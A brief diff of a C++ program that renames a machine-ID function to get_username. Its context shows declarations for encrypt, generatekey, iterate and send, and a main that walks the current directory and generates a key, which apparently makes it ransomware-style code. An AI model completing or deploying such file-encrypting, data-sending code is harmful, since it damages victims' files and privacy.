@@ -18,13 +18,13 @@ void encrypt(const crypt_data* data, string path);
 crypt_data* generatekey();
 void iterate(const path& parent);
 void process(const path& path);
-string getid();
+string get_username();
 void send();
 
 int main(int argc, char* argv[]) {
 	iterate(".");
 
-	cout << "Computer ID: " << getid() << endl;
+	cout << "Username: " << get_username() << endl;
 
 	crypt_data* d = generatekey();
 
@@ -125,7 +125,7 @@ void process(const path& path) {
 #endif
 }
 
-string getid() {
+string get_username() {
 #ifdef _WIN32
 	char username[UNLEN + 1];
 	DWORD length = UNLEN + 1;
